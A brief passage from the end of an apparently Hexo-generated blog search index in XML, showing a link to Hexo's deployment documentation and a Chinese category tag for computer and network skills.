href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>计算机和网络技能</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
